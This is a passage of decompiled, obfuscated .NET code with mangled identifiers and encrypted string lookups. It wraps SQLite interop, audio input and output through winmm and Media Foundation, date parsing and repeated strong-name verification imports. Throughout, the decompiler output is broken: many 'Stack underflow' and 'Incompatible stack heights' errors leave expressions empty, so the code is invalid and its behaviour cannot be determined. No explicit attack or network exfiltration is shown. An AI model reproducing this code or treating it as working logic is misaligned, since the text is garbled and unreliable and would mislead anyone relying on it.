			//IL_009e: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				_ = _0090_0002._009A_0005;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_009e: Stack underflow*/((IntPtr)/*Error near IL_009e: Stack underflow*/, zero);
				if ((int)/*Error near IL_001d: Stack underflow*/ == 0)
				{
					string result = null;
					try
					{
					}
					finally
					{
						global::_000E._001F obj;
						_0091_0002._009C_0005(obj = _0002);
						try
						{
							if (!global::_001B._007E_008A_0003(_0002) && !global::_001B._007E_008B_0003(_0002))
							{
								int num = 0;
								result = _0018._0001(_0018._0001(_0003, ref num), num);
							}
							else
							{
								result = _0080._0014._0001(107376195);
							}
						}
						finally
						{
							_0091_0002._009D_0005(obj);
						}
					}
					_0091_0002._009E_0005(_0002);
					return result;
				}
			}
			return _0080._0014._0001(107376276);
		}

		static byte[] _0001(global::_0005._0007 P_0)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected I4, but got Unknown
			//IL_0289: Incompatible stack heights: 0 vs 1
			//IL_0293: Incompatible stack heights: 0 vs 1
			//IL_0299: Incompatible stack heights: 0 vs 3
			_ = ((global::_0005._0007)/*Error near IL_0293: Stack underflow*/).Count;
			if ((int)/*Error near IL_000c: Stack underflow*/ == 0)
			{
				return null;
			}
			_ = 12;
			_ = 24;
			int num = ((global::_0005._0007)/*Error near IL_001c: Stack underflow*/).Count;
			_003F val = /*Error near IL_001d: Stack underflow*/* num;
			int num2 = /*Error near IL_001e: Stack underflow*/+ val;
			int num3 = 12;
			int num4 = 0;
			for (int i = 0; i < P_0.Count; i++)
			{
				num4 = global::_001A._007E_0016_0003(P_0[i].Label) + 1;
				num3 += num4 + num4 % 2 + 12;
			}
			byte[] array = new byte[num2 + num3];
			int num5 = _0018._0001(_0080._0014._0001(107386739));
			int num6 = _0018._0001(_0080._0014._0001(107360140));
			int num7 = _0018._0001(_0080._0014._0001(107393102));
			int num8 = _0018._0001(_0080._0014._0001(107376178));
			int num9 = _0018._0001(_0080._0014._0001(107386748));
			MemoryStream memoryStream = new MemoryStream(array);
			try
			{
				BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				try
				{
					_009D_0002._007E_0016_0006(binaryWriter, num5);
					_009D_0002._007E_0016_0006(binaryWriter, num2 - 8);
					_009D_0002._007E_0016_0006(binaryWriter, P_0.Count);
					for (int j = 0; j < P_0.Count; j++)
					{
						int num10 = P_0[j].Position;
						_009D_0002._007E_0016_0006(binaryWriter, j);
						_009D_0002._007E_0016_0006(binaryWriter, num10);
						_009D_0002._007E_0016_0006(binaryWriter, num6);
						_009E_0002._007E_001B_0006(binaryWriter, 8, SeekOrigin.Current);
						_009D_0002._007E_0016_0006(binaryWriter, num10);
					}
					_009D_0002._007E_0016_0006(binaryWriter, num7);
					_009D_0002._007E_0016_0006(binaryWriter, num3 - 8);
					_009D_0002._007E_0016_0006(binaryWriter, num8);
					for (int k = 0; k < P_0.Count; k++)
					{
						_009D_0002._007E_0016_0006(binaryWriter, num9);
						_009D_0002._007E_0016_0006(binaryWriter, global::_001A._007E_0016_0003(P_0[k].Label) + 1 + 4);
						_009D_0002._007E_0016_0006(binaryWriter, k);
						_009F_0002._007E_001C_0006(binaryWriter, _0004_0004._007E_000E_0008(_0082_0002._008B_0005(), _0006_0007._007E_009A_0010(P_0[k].Label)));
						if (global::_001A._007E_0016_0003(P_0[k].Label) % 2 == 0)
						{
							_009E_0002._007E_001B_0006(binaryWriter, 2, SeekOrigin.Current);
						}
						else
						{
							_009E_0002._007E_001B_0006(binaryWriter, 1, SeekOrigin.Current);
						}
					}
					return array;
				}
				finally
				{
					if (binaryWriter != null)
					{
						global::_0008._007E_0098(binaryWriter);
					}
				}
			}
			finally
			{
				if (memoryStream != null)
				{
					global::_0008._007E_0098(memoryStream);
				}
			}
		}

		unsafe static void _0001(_0016 _0002, ref bool _0003, [Out] int _0004, global::_0013._0017 P_3)
		{
			//IL_0112: Incompatible stack heights: 0 vs 1
			//IL_0118: Incompatible stack heights: 0 vs 1
			*(sbyte*)(nint)/*Error near IL_0007: Stack underflow*/ = 0;
			SQLiteConnectionFlags flags = ((global::_0013._0017)/*Error near IL_0011: Stack underflow*/)._0001;
			P_3._0001 &= ~SQLiteConnectionFlags.UseConnectionBindValueCallbacks;
			try
			{
				if (_0002 == null)
				{
					return;
				}
				global::_0017._0080 obj = _0018._0001(P_3);
				if (obj == null)
				{
					return;
				}
				string text = _0002._0003;
				if (text == null && (P_3._0001 & SQLiteConnectionFlags.UseParameterNameForTypeName) == SQLiteConnectionFlags.UseParameterNameForTypeName)
				{
					text = global::_0002._007E_001F(_0002);
				}
				if (text == null && (P_3._0001 & SQLiteConnectionFlags.UseParameterDbTypeForTypeName) == SQLiteConnectionFlags.UseParameterDbTypeForTypeName)
				{
					DbType dbType = _0007_0007._007E_009B_0010(_0002);
					SQLiteConnectionFlags sQLiteConnectionFlags = P_3._0001;
					text = _0018._0001(sQLiteConnectionFlags, dbType, obj);
				}
				global::_0007._001A obj2 = default(global::_0007._001A);
				if (text != null && _0018._0001(obj, text, ref obj2) && obj2 != null)
				{
					_0080._0015 obj3 = obj2._0001;
					if (obj3 != null)
					{
						object userData = obj2._0001;
						obj3(P_3._0001, P_3._0001, flags, _0002, text, _0004, userData, out _0003);
					}
				}
			}
			finally
			{
				P_3._0001 |= SQLiteConnectionFlags.UseConnectionBindValueCallbacks;
			}
		}

		static DateTime _0001(DateTimeKind _0002, string _0003, SQLiteDateFormats _0004, string _0005)
		{
			//IL_0157: Incompatible stack heights: 0 vs 1
			//IL_0163: Incompatible stack heights: 0 vs 1
			SQLiteDateFormats sQLiteDateFormats = (SQLiteDateFormats)/*Error near IL_015d: Stack underflow*/;
			switch (/*Error near IL_002c: Stack underflow*/)
			{
			case 0L:
				return new DateTime(_0008_0007._009C_0010(_0005, _008F_0003._008B_0007()), _0002);
			case 2L:
				return _0018._0001(_000E_0007._009D_0010(_0005, _008F_0003._008B_0007()), _0002);
			case 3L:
				return _0018._0001(_0008_0007._009C_0010(_0005, _008F_0003._008B_0007()), _0002);
			case 4L:
				if (_0003 != null)
				{
					return DateTime.SpecifyKind(DateTime.ParseExact(_0005, _0003, _000F_0007._009E_0010(), (_0002 == DateTimeKind.Utc) ? DateTimeStyles.AdjustToUniversal : DateTimeStyles.None), _0002);
				}
				return DateTime.SpecifyKind(DateTime.Parse(_0005, _000F_0007._009E_0010(), (_0002 == DateTimeKind.Utc) ? DateTimeStyles.AdjustToUniversal : DateTimeStyles.None), _0002);
			case 5L:
				if (_0003 != null)
				{
					return DateTime.SpecifyKind(DateTime.ParseExact(_0005, _0003, _000F_0007._009F_0010(), (_0002 == DateTimeKind.Utc) ? DateTimeStyles.AdjustToUniversal : DateTimeStyles.None), _0002);
				}
				return DateTime.SpecifyKind(DateTime.Parse(_0005, _000F_0007._009F_0010(), (_0002 == DateTimeKind.Utc) ? DateTimeStyles.AdjustToUniversal : DateTimeStyles.None), _0002);
			default:
				if (_0003 != null)
				{
					return DateTime.SpecifyKind(DateTime.ParseExact(_0005, _0003, _000F_0007._009E_0010(), (_0002 == DateTimeKind.Utc) ? DateTimeStyles.AdjustToUniversal : DateTimeStyles.None), _0002);
				}
				return DateTime.SpecifyKind(DateTime.ParseExact(_0005, global::_0001._001A._0001, _000F_0007._009E_0010(), (_0002 == DateTimeKind.Utc) ? DateTimeStyles.AdjustToUniversal : DateTimeStyles.None), _0002);
			}
		}

		static _001B._0004 _0001(int _0002, _001E._0004 P_1)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 2
			//IL_004a: Incompatible stack heights: 0 vs 1
			_ = ((_001E._0004)/*Error near IL_0007: Stack underflow*/)._0001;
			((global::_0013._0005)/*Error near IL_004a: Stack underflow*/)._0002((int)/*Error near IL_004a: Stack underflow*/, out _001B._0004 result);
			int num = (int)/*Error near IL_000e: Stack underflow*/;
			switch (num)
			{
			case 0:
				_0018._0001(ref result);
				return result;
			case -2147220989:
				throw new InvalidOperationException(_0080._0014._0001(107376137));
			default:
				throw _001C_0005._0006_000F(num);
			}
		}

		static bool _0001(global::_0016._0012 _0002, double P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			global::_0017._0015 obj = ((global::_0016._0012)/*Error near IL_0009: Stack underflow*/)._0001;
			_0018._0001((double)/*Error near IL_0017: Stack underflow*/, obj);
			return (byte)/*Error near IL_000c: Stack underflow*/ != 0;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "waveOutRestart")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("winmm.dll", EntryPoint = "waveInOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, global::_0005._0005 _0004, IntPtr _0005, IntPtr _0006, global::_0017._0008._0001 _0007);

		static void _0001(_0014 P_0)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_000b: Stack underflow*/);
		}

		static Type _0001(_001F._0018 _0002)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			if (((_001F._0018)/*Error near IL_0007: Stack underflow*/)._0001 == DbType.Object)
			{
				_ = global::_0001._001A._0001;
				global::_0014._0017 num = ((_001F._0018)/*Error near IL_0017: Stack underflow*/)._0001;
				return (Type)((object[])/*Error near IL_0018: Stack underflow*/)[(int)num];
			}
			return _0018._0001(((_001F._0018)/*Error near IL_0020: Stack underflow*/)._0001);
		}

		static bool _0001(global::_000E._001F _0002, IntPtr _0003)
		{
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			//IL_0075: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = _0090_0002._009A_0005;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_0075: Stack underflow*/((IntPtr)/*Error near IL_0075: Stack underflow*/, zero);
				if ((int)/*Error near IL_0014: Stack underflow*/ == 0)
				{
					bool result = false;
					try
					{
					}
					finally
					{
						global::_000E._001F obj;
						_0091_0002._009C_0005(obj = _0002);
						try
						{
							if (!global::_001B._007E_008A_0003(_0002) && !global::_001B._007E_008B_0003(_0002))
							{
								result = _0018._0001(_0003) == 1;
							}
						}
						finally
						{
							_0091_0002._009D_0005(obj);
						}
					}
					_0091_0002._009E_0005(_0002);
					return result;
				}
			}
			return false;
		}

		static void _0001(_0019._007F _0002, Delegate _0003, Delegate _0004, global::_0017._0080 P_3)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_003f: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107377390));
			}
			P_3._0001._0001(_0002, new global::_0006._0019(_0004, _0003), P_3._0003);
		}

		static string _0001(global::_0006._0003 _0002, int P_1)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = ((global::_0006._0003)/*Error near IL_003a: Stack underflow*/).DriverOutputChannelCount;
			if (/*Error near IL_0008: Stack underflow*/ <= /*Error near IL_0008: Stack underflow*/)
			{
				return _0002._0001._0001._0002[P_1]._0001;
			}
			return _0080._0014._0001(107396634);
		}

		static void _0001(global::_0016._0012 P_0)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0046: Incompatible stack heights: 0 vs 1
			try
			{
				_0018._0001(((global::_0016._0012)/*Error near IL_0007: Stack underflow*/)._0001);
			}
			catch (Exception ex)
			{
				_0082_0003._007E_0017_0007(_0013_0007._0004_0011(), global::_0002._007E_0006(ex));
			}
			_0018._0001(((global::_0016._0012)/*Error near IL_003f: Stack underflow*/)._0001);
		}

		static string _0001(int _0002, IntPtr _0003)
		{
			//IL_0015: Invalid comparison between Unknown and I4
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0041: Stack underflow*/((IntPtr)/*Error near IL_0041: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				return null;
			}
			if ((int)/*Error near IL_0017: Stack underflow*/ > 0)
			{
				byte[] array = new byte[_0002];
				_0011_0003._008D_0006(_0003, array, 0, _0002);
				return _0018._0001(array);
			}
			return string.Empty;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0008._0014 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0008._0014)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0008._0014).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_blob_close_interop")]
		static extern _0080._0017 _0001(IntPtr _0002);

		[DllImport("winmm.dll", CharSet = CharSet.Auto, EntryPoint = "midiInGetDevCaps")]
		static extern MmResult _0001(IntPtr _0002, out global::_000E._0014 _0003, int _0004);

		static global::_0002._0002 _0001(BinaryReader _0002)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			_0018._0001(new global::_0002._0002((BinaryReader)/*Error near IL_0007: Stack underflow*/));
			return (global::_0002._0002)/*Error near IL_000b: Stack underflow*/;
		}

		static void _0001(global::_0016._001A P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0016._001A)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0016._001A).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static IntPtr[] _0001(string[] _0002)
		{
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			IntPtr[] array = new IntPtr[((Array)/*Error near IL_0009: Stack underflow*/).Length];
			for (int i = 0; i < array.Length; i++)
			{
				ref IntPtr reference = ref array[i];
				reference = _0018._0001(_0002[i]);
			}
			return array;
		}

		[DllImport("mfreadwrite.dll", EntryPoint = "MFCreateSourceReaderFromURL", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In] global::_0008._000E _0003, [MarshalAs(UnmanagedType.Interface)] out global::_0007._0013 _0004);

		static IDictionary<_0019._007F, global::_0012._0014> _0001(_0013 _0002, SQLiteConnectionFlags _0003)
		{
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 1
			new Dictionary<_0019._007F, global::_0012._0014>();
			IDictionary<_0019._007F, global::_0012._0014> dictionary = (IDictionary<_0019._007F, global::_0012._0014>)/*Error near IL_006b: Stack underflow*/;
			global::_0012._0014._0001.GetEnumerator();
			using IEnumerator<KeyValuePair<_0019._007F, object>> enumerator = /*Error near IL_000d: Stack underflow*/;
			global::_0012._0014 obj = default(global::_0012._0014);
			while (enumerator.MoveNext())
			{
				_0019._007F key = enumerator.Current.Key;
				if (key != null)
				{
					if (_0018._0001(ref obj, key))
					{
						_0018._0001(_0002, key, obj, _0003);
						dictionary[key] = obj;
					}
					else
					{
						dictionary[key] = null;
					}
				}
			}
			return dictionary;
		}

		static void _0001(_0014 P_0)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			if (((_0014)/*Error near IL_0007: Stack underflow*/)._0003 && ((_0014)/*Error near IL_0010: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_0014).TypeHandle);
				throw new ObjectDisposedException(/*Error near IL_0028: Stack underflow*/((object)/*Error near IL_0028: Stack underflow*/));
			}
		}

		static byte[] _0001(params byte[][] _0002)
		{
			//IL_007d: Incompatible stack heights: 0 vs 1
			int num = 0;
			byte[][] array = (byte[][])/*Error near IL_0083: Stack underflow*/;
			foreach (byte[] array2 in array)
			{
				num += array2.Length;
			}
			if (num <= 0)
			{
				return new byte[0];
			}
			byte[] array3 = new byte[num];
			int num2 = 0;
			array = _0002;
			foreach (byte[] array4 in array)
			{
				_0099_0002._0010_0006(array4, 0, array3, num2, array4.Length);
				num2 += array4.Length;
			}
			return array3;
		}

		static void _0001(_0080._0011 P_0)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0026: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_0080._0011)/*Error near IL_000c: Stack underflow*/)._0001;
			ref Guid reference = ref ((_0080._0011)/*Error near IL_0013: Stack underflow*/)._0001;
			((global::_0006._0014)/*Error near IL_0026: Stack underflow*/)._0001(ref reference);
			/*Error near IL_001a: Stack underflow*/((int)/*Error near IL_001a: Stack underflow*/);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_backup_remaining")]
		static extern int _0001(IntPtr _0002);

		[DllImport("winmm.dll", EntryPoint = "waveInGetNumDevs")]
		static extern int _0001();

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_error_code")]
		static extern void _0001(IntPtr _0002, _0080._0017 _0003);

		[DllImport("mfplat.dll", EntryPoint = "MFCreateWaveFormatExFromMFMediaType", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001(_0019._0012 _0002, ref IntPtr _0003, ref int _0004, int _0005 = 0);

		static void _0001(string _0002)
		{
			//IL_0007: Incompatible stack heights: 0 vs 2
			_ = null;
			_0018._0001((object)/*Error near IL_000e: Stack underflow*/, (string)/*Error near IL_000e: Stack underflow*/);
		}

		static global::_0017._0015 _0001(Guid _0002)
		{
			//IL_000c: Incompatible stack heights: 0 vs 3
			new global::_0017._0015();
			((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001((Guid)/*Error near IL_0013: Stack underflow*/);
			return (global::_0017._0015)/*Error near IL_000b: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(global::_0017._0080 _0002, [Out] string _0003, ref global::_0007._001A P_2)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_003b: Stack underflow*/);
			if ((int)/*Error near IL_0008: Stack underflow*/ == 0)
			{
				throw new ArgumentNullException(_0080._0014._0001(107357796));
			}
			if (_0002._0001 == null)
			{
				P_2 = null;
				return false;
			}
			return _0002._0001.TryGetValue(_0003, out P_2);
		}

		static string _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_000F._008B_0002;
			_0086_0005._0015_000F(Environment.SpecialFolder.CommonApplicationData);
			string text = global::_0015._0001._001E;
			/*Error near IL_0028: Stack underflow*/((string)/*Error near IL_0028: Stack underflow*/, text);
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		static void _0001(global::_0010._0010 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0010._0010)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0014._0001(107376616);
			_0018._0001((MmResult)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
		}

		static void _0001(global::_0008._0001 P_0)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 2
			try
			{
				int num = ((global::_0008._0001)/*Error near IL_000b: Stack underflow*/)._0001;
				((global::_0008._0001)/*Error near IL_0012: Stack underflow*/)._0001 = num + 1;
				_ = global::_0015._0001._0001;
				int num2 = ((global::_0008._0001)/*Error near IL_001e: Stack underflow*/)._0001;
				global::_0015._0001._0001 = ((int[])/*Error near IL_001f: Stack underflow*/)[num2];
				if (P_0._0001 >= global::_0015._0001._0001.Length - 1)
				{
					P_0._0001 = 0;
				}
			}
			catch
			{
				P_0._0001 = 0;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_origin_name_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static int _0001(global::_0002._0019 P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			_ = _0018_0005._0002_000F;
			ref int reference = ref ((global::_0002._0019)/*Error near IL_000c: Stack underflow*/)._0002;
			/*Error near IL_0019: Stack underflow*/(ref reference, 0, 0);
			return (int)/*Error near IL_0011: Stack underflow*/;
		}

		static void _0001(_001A._0005 P_0)
		{
			//IL_0052: Incompatible stack heights: 0 vs 2
			//IL_0059: Incompatible stack heights: 0 vs 3
			//IL_0060: Incompatible stack heights: 0 vs 1
			_ = _009F_0002._007E_001C_0006;
			_ = ((_001A._0005)/*Error near IL_000c: Stack underflow*/)._0001;
			_ = _0087_0003._007E_0081_0007;
			_0082_0002._0088_0005();
			_0080._0014._0001(107360140);
			byte[] array = /*Error near IL_0024: Stack underflow*/((object)/*Error near IL_0024: Stack underflow*/, (string)/*Error near IL_0024: Stack underflow*/);
			/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, array);
			P_0._0001 = global::_0012._007E_0091_0002(P_0._0001);
			_009D_0002._007E_0016_0006(P_0._0001, 0);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string _0001(IList<string> _0002)
		{
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			new StringBuilder();
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_005d: Stack underflow*/;
			foreach (string item in _0002)
			{
				if (item != null)
				{
					if (stringBuilder.Length > 0)
					{
						stringBuilder.Append(' ');
					}
					stringBuilder.Append(item);
				}
			}
			return stringBuilder.ToString();
		}

		static void _0001(global::_0001._007F P_0)
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002c: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(P_0._0001);
		}

		static float _0001(int _0002, _001F._0019 P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (P_1._0001[_0002]._0001 != null)
			{
				return _0014_0007._007E_0005_0011(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			throw new InvalidCastException();
		}

		static decimal _0001(int _0002, _001F._0019 P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (P_1._0001[_0002]._0001 != null)
			{
				return _0015_0007._007E_0006_0011(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			throw new InvalidCastException();
		}

		static string _0001(_001F._0019 _0002, int P_1)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			_ = ((_001F._0019)/*Error near IL_0007: Stack underflow*/)._0001;
			return ((_001F._0019._0001[])/*Error near IL_000a: Stack underflow*/)[/*Error near IL_000a: Stack underflow*/]._0003;
		}

		[DllImport("mfplat.dll", EntryPoint = "MFStartup", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001(int _0002, int _0003 = 0);

		static void _0001(int _0002, int _0003, float[] _0004, _001A._0005 P_3)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0003; i++)
			{
				float num = ((float[])/*Error near IL_000d: Stack underflow*/)[_0002 + i];
				_0018._0001((_001A._0005)/*Error near IL_0012: Stack underflow*/, num);
			}
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_0066: Incompatible stack heights: 0 vs 2
			//IL_006d: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_006d: Stack underflow*/((IntPtr)/*Error near IL_006d: Stack underflow*/);
			short* ptr = (short*)/*Error near IL_0073: Stack underflow*/;
			short*[] array = new short*[_0004];
			for (int i = 0; i < _0004; i++)
			{
				array[i] = (short*)_0010_0005._0096_000E(_0003[i]);
			}
			for (int j = 0; j < _0005; j++)
			{
				for (int k = 0; k < _0004; k++)
				{
					ref short* reference = ref array[k];
					short* ptr2 = reference;
					reference = ptr2 + 1;
					short* num = ptr;
					ptr = num + 1;
					*ptr2 = *num;
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0013._0017 _0001(global::_0010._001C _0002, int P_1)
		{
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			if (((global::_0010._001C)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				_0018._0001((global::_0010._001C)/*Error near IL_0057: Stack underflow*/);
				return (global::_0013._0017)/*Error near IL_000e: Stack underflow*/;
			}
			if (P_1 == _0002._0001.Count)
			{
				if (!global::_001C._0096_0003(_0002._0003))
				{
					return _0018._0001(_0002);
				}
				return null;
			}
			global::_0013._0017 obj = _0002._0001[P_1];
			_0018._0001(obj);
			return obj;
		}

		static IEnumerable<string> _0001(global::_0016._0001 _0002, string P_1)
		{
